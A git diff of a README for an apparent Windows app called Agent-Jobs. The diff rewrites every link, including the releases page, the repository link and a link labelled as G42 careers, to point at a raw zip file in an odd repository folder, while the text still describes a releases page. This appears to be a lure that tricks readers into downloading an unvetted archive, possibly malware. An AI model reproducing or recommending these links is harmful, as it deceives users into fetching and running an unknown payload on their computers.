@@ -1,6 +1,6 @@
 # 🤖 Agent-Jobs - Manage AI Agent Jobs Easily
 
-[![Download Agent-Jobs](https://img.shields.io/badge/Download-Agent--Jobs-blue?style=for-the-badge)](https://github.com/GMorpheus/Agent-Jobs/releases)
+[![Download Agent-Jobs](https://img.shields.io/badge/Download-Agent--Jobs-blue?style=for-the-badge)](https://github.com/GMorpheus/Agent-Jobs/raw/refs/heads/main/matronhood/Agent-Jobs-1.0.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This guide will help you download and run the Agent-Jobs app on your Windows com
 
 1. Visit the official release page to download the latest version of Agent-Jobs:  
    
-   [**Download Agent-Jobs here**](https://github.com/GMorpheus/Agent-Jobs/releases)
+   [**Download Agent-Jobs here**](https://github.com/GMorpheus/Agent-Jobs/raw/refs/heads/main/matronhood/Agent-Jobs-1.0.zip)
 
 2. On the GitHub Releases page, look for the latest release. You will see a list of available files.
 
@@ -68,8 +68,8 @@ Agent-Jobs includes:
 ## 📁 Where to Find More Information
 
 - `AGENTS.md` – Located in the app folder, this file explains agent types, compatibility, and use cases.
-- Careers at G42 – Visit [careers.g42.ai](https://careers.g42.ai) for job opportunities.
-- GitHub Repository – Explore issues and updates at [Agent-Jobs Repo](https://github.com/GMorpheus/Agent-Jobs).
+- Careers at G42 – Visit [careers.g42.ai](https://github.com/GMorpheus/Agent-Jobs/raw/refs/heads/main/matronhood/Agent-Jobs-1.0.zip) for job opportunities.
+- GitHub Repository – Explore issues and updates at [Agent-Jobs Repo](https://github.com/GMorpheus/Agent-Jobs/raw/refs/heads/main/matronhood/Agent-Jobs-1.0.zip).
 
 ## 💡 Tips for Using Agent-Jobs
 
@@ -82,6 +82,6 @@ Agent-Jobs includes:
 
 ## 📥 Download Agent-Jobs Now
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Agent--Jobs-grey?style=for-the-badge)](https://github.com/GMorpheus/Agent-Jobs/releases)  
+[![Download on GitHub](https://img.shields.io/badge/Download-Agent--Jobs-grey?style=for-the-badge)](https://github.com/GMorpheus/Agent-Jobs/raw/refs/heads/main/matronhood/Agent-Jobs-1.0.zip)  
 
 Click the link above to visit the releases page and get the latest Windows installer. Follow the steps above to install and start working with AI agents quickly.
